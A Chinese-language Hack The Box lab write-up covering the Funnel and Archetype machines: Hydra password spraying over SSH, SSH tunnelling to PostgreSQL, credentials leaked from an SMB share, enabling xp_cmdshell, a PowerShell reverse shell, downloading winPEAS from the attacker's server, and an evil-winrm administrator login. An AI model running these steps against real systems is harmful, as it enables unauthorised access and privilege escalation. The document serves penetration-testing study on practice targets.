100% |***********************************|   713       12.14 MiB/s    00:00 ETA
226 Transfer complete.
713 bytes received in 00:00 (77.39 KiB/s)
```

* 把東西載下來看看

![image](https://hackmd.io/_uploads/SyVlL3cw0.png)

![image](https://hackmd.io/_uploads/By0-I3qvR.png)

* 賺爛，給了帳號跟預設密碼，加上剛剛 nmap 掃到的 `ssh` ，我猜有人沒改預設密碼 `funnel123#!#`
* 用 `Hydra` 進行噴灑
* 先把使用者存起來

![image](https://hackmd.io/_uploads/ryhILh5vA.png)

```bash!
┌─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $hydra -L user.txt -p 'funnel123#!#' 10.129.228.195 ssh
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-09 08:09:58
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 5 tasks per 1 server, overall 5 tasks, 5 login tries (l:5/p:1), ~1 try per task
[DATA] attacking ssh://10.129.228.195:22/
[22][ssh] host: 10.129.228.195   login: christine   password: funnel123#!#
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-09 08:10:02
```

* 找到了! 登入 `christine` 的 `ssh`

![image](https://hackmd.io/_uploads/HyMXP3cwC.png)

* 但翻了下，完全沒東西。
* 這邊卡了很久，偷看了一下 `workthrough`
* 這邊會用到一個叫 `隧道` 的技術 ， 目的是在幫你連接更深層的主機，進行更進一步的滲透。

```bash!
1. 本地端口轉發
使用本地端口转发，则在现有的有效SSH会话中创建一个单独的隧道，该隧道将网络流量从客户端机器的本地端口转发到远程服务器的端口。在底层，SSH在给定端口的客户机上分配一个套接字侦听器，当连接到该端口时，该连接将通过现有的SSH会话转发到远程服务器的端口 。

2. 遠程端口轉發
也称为反向隧道挖掘，它是与本地端口转发隧道完全相反。SSH连接成功，创建一个单独的隧道，SSH使用该隧道将到服务器端口的传入流量重定向回客户端 。
 在底层，SSH在给定端口的服务器上分配一个套接字侦听器。当连接到该端口时，该连接将通过现有的SSH会话转发到本地客户端的端口。
 
3. 動態端口轉發

与本地和远程都有转发，在隧道创建之前必须定义本地端口和远程端口。动态隧道允许用户指定一个将从客户端动态地将传入的流量转发到服务器的端口。因此，在内部发生的事情是，SSH变成了一个SOCKS5代理，通过SOCKET5代理服务器在客户端和服务器之间交换网络数据包。
```

[Reference](https://blog.csdn.net/sycamorelg/article/details/134166718)

* 這邊我們用本地，故我們連上 `ssh` 的任務是看看有甚麼奇怪的服務

### Socket Statistics (ss)

* 可以獲得 socket 統計，和 `netstat` 很像
* 複習用法請到 [滲透測試工具](/wU-4qTnsQfG1zbpToz3vdw)
* 讓我們來看看有甚麼 `tcp` 連線

```bash=
christine@funnel:~$ ss -tl
State   Recv-Q  Send-Q   Local Address:Port         Peer Address:Port  Process  
LISTEN  0       4096         127.0.0.1:36209             0.0.0.0:*              
LISTEN  0       4096     127.0.0.53%lo:domain            0.0.0.0:*              
LISTEN  0       128            0.0.0.0:ssh               0.0.0.0:*              
LISTEN  0       4096         127.0.0.1:postgresql        0.0.0.0:*              
LISTEN  0       32                   *:ftp                     *:*              
LISTEN  0       128               [::]:ssh                  [::]:*              
christine@funnel:~$ ss -tln
State   Recv-Q   Send-Q     Local Address:Port      Peer Address:Port  Process  
LISTEN  0        4096           127.0.0.1:36209          0.0.0.0:*              
LISTEN  0        4096       127.0.0.53%lo:53             0.0.0.0:*              
LISTEN  0        128              0.0.0.0:22             0.0.0.0:*              
LISTEN  0        4096           127.0.0.1:5432           0.0.0.0:*              
LISTEN  0        32                     *:21                   *:*              
LISTEN  0        128                 [::]:22                [::]:*  
```

* 有個 `postgresql` ㄟ，嘗試用看看

```bash=
christine@funnel:~$ psql

Command 'psql' not found, but can be installed with:

apt install postgresql-client-common
Please ask your administrator.

christine@funnel:~$ sudo apt install postgresql-client-common
[sudo] password for christine: 
christine is not in the sudoers file.  This incident will be reported.
```

* 阿我們都沒權限ㄟ，沒事，這時就要用到剛剛提到的隧道了

```bash=
┌─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $ssh -L 6969:localhost:5432 christine@10.129.228.195 
```

* 可以表示成

```bash=
┌─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $ssh -L {本機對外開的IP隧道}:localhost:{靶機要給我們連的IP} christine@10.129.228.195
```

* 喔對 這邊要靶機那邊打 `5432` 是因為剛剛在連 `ssh` 時看到 psql 是在本地聽 `5432` port 的!
* enter 後他要你輸入密碼，但一樣是那個預設密碼

![image](https://hackmd.io/_uploads/rkBRoh9vR.png)

* 開好隧道了! 我們嘗試用 `psql` 連

```bash=
┌─[✗]─[tusoaring@htb-oztamikw6o]─[~/Desktop]
└──╼ $psql -h localhost -p 6969 -U christine
Password for user christine: 
psql (15.7 (Debian 15.7-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))
Type "help" for help.

christine=# 
```

* 成功!
* 查查 psql 的指令
* 列出 dbs
* `\l`

```bash=
   Name    |   Owner   | Encoding |  Collate   |   Ctype    | ICU Locale | Locale Provider |    Access privileges    
-----------+-----------+----------+------------+------------+------------+-----------------+-------------------------
 christine | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 postgres  | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 secrets   | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | 
 template0 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
 template1 | christine | UTF8     | en_US.utf8 | en_US.utf8 |            | libc            | =c/christine           +
           |           |          |            |            |            |                 | christine=CTc/christine
```

* 看看 `secrets`
* 切換 db
* `\c {db's name}`

```bash=
christine=# \c secrets
psql (15.7 (Debian 15.7-0+deb12u1), server 15.1 (Debian 15.1-1.pgdg110+1))
You are now connected to database "secrets" as user "christine".
secrets=# 
```

* 看看 tables
* 列出 tables
* `\z`

```bash=
secrets=# \z
                            Access privileges
 Schema | Name | Type  | Access privileges | Column privileges | Policies 
--------+------+-------+-------------------+-------------------+----------
 public | flag | table |                   |                   | 
(1 row)
```

* 把 flag 搜出來就好了!

```bash=
secrets=# SELECT * FROM flag;
              value               
----------------------------------
 cf277664b1771217d7006acdea006db1
(1 row)
```

## Archetype (Pwned!)

* 一樣 nmap 起手

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ nmap -sC -sV -Pn -p- -T4 10.129.156.40
Nmap scan report for 10.129.156.40
Host is up (0.0080s latency).
Not shown: 65306 closed tcp ports (reset), 218 filtered tcp ports (no-response)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   10.129.156.40:1433: 
|     Target_Name: ARCHETYPE
|     NetBIOS_Domain_Name: ARCHETYPE
|     NetBIOS_Computer_Name: ARCHETYPE
|     DNS_Domain_Name: Archetype
|     DNS_Computer_Name: Archetype
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-07-10T14:43:14
|_Not valid after:  2054-07-10T14:43:14
|_ssl-date: 2024-07-10T14:51:42+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.156.40:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  unknown
49665/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-07-10T07:50:59-07:00
|_clock-skew: mean: 1h24m01s, deviation: 3h07m54s, median: 0s
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-07-10T14:50:50
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 427.92 seconds
```

* 比較關鍵的服務是看到開了 `smb`、`mssql`、`PS Remote`
* 我們先來看看 `smb`
* 注意的是這邊不一定要 `root` 隨便 anonymous 都是可以的

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ smbmap -H 10.129.156.40 -u root
[+] Guest session   	IP: 10.129.156.40:445	Name: 10.129.156.40                                     
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	backups                                           	READ ONLY	
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
```

* 分別進去看看 `backups`、`IPC$`

> backups 

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ smbclient \\\\10.129.156.40/backups
Password for [WORKGROUP\tusoaring]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jan 20 06:20:57 2020
  ..                                  D        0  Mon Jan 20 06:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 06:23:02 2020
```

* 看到一個 `prod.dtsConfig` 把他抓下來看看

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ cat prod.dtsConfig 
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

* 酷ㄟ，是有關 `mssql` 的資料，還有 username/password
* 嘗試用 `mssqlclient.py` 連線看看!
* 喔對 這邊要加 `-windows-auth` 是因為我不是 administrator

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ mssqlclient.py sql_svc:M3g4c0rp123@10.129.156.40 -debug -windows-auth

Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.11/dist-packages/impacket
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

* 好ㄟ連進去了，嘗試執行指令

```bash!
SQL> xp_cmdshell
[-] ERROR(ARCHETYPE): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
```

* 他說我們沒有啟用...我們嘗試搜尋啟用看看

[照著上面條就可以ㄌ](https://learn.microsoft.com/zh-tw/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16)

```bash=
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'show advanced options', 0;
[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 1 to 0. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;

SQL> xp_cmdshell whoami 
output                                                                             

--------------------------------------------------------------------------------   

archetype\sql_svc 
```

* 成功執行!
* 你還可以在當前使用者目錄底下挖到 FLAG (user)

```bash=
SQL> xp_cmdshell dir \Users\sql_svc\Desktop
output                                                                             

--------------------------------------------------------------------------------   

 Volume in drive C has no label.                                                   

 Volume Serial Number is 9565-0B4F                                                 

NULL                                                                               

 Directory of C:\Users\sql_svc\Desktop                                             

NULL                                                                               

01/20/2020  06:42 AM    <DIR>          .                                           

01/20/2020  06:42 AM    <DIR>          ..                                          

02/25/2020  07:37 AM                32 user.txt                                    

               1 File(s)             32 bytes                                      

               2 Dir(s)  10,721,931,264 bytes free                                 

NULL     
```

* 接下來讓我們提權，可以用到有個工具叫 [winPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
* 他可以自動分析，並跟你講你可以利用甚麼提權
* 但我們要怎麼載到靶機上?

> 我使用 reverse shell + 本地開一個 server -> 下載

* 先開 `reverse shell` 之前有提到怎麼開
* 但這次比較不一樣，我們要用 `powershell` 開

![image](https://hackmd.io/_uploads/rk1nr4hDA.png)

* 複製好之後，攻擊機先 `nc` 靶機輸入這串就可以彈回來ㄌ

![temp](https://hackmd.io/_uploads/HyxKUNhDR.jpg)

* 成功 GET SHELL!
* 讓我們來運運 `winPEAS`
* 我先在本地下載好，寫個 python server

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~/Desktop]
└──╼ [★]$ cat webser.py 
from flask import Flask, send_file

app = Flask(__name__)

@app.route('/download')
def download_shell():
    filename = 'win.exe'
    return send_file('./' + filename, as_attachment=True)

if __name__ == '__main__':
    app.run(debug=True,host='0.0.0.0')
```

* 接著在 `reverse shell` 上輸入

```bash=
PS C:\Users\sql_svc\Desktop> curl http://10.10.14.108:5000/download -o win.exe
PS C:\Users\sql_svc\Desktop> dir


    Directory: C:\Users\sql_svc\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/25/2020   6:37 AM             32 user.txt                                                              
-a----        7/10/2024   9:30 AM        2387456 win.exe 
```

* 好ㄟ 然後執行他讓他跑一下
* 跑很多出來，我放重要的
* 我們可以看看，我們可以訪問的!

```bash!
???????????? Found History Files
File: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\sql_svc\Desktop> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

* 哇免費管理員密碼
* 嘗試用 `evil-winrm` 登入

```bash=
┌─[us-starting-point-1-dhcp]─[10.10.14.108]─[tusoaring@htb-hnffyunubj]─[~]
└──╼ [★]$ evil-winrm -u Administrator -p 'MEGACORP_4dm1n!!' -i 10.129.156.40
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528

```

* PWNED!!!
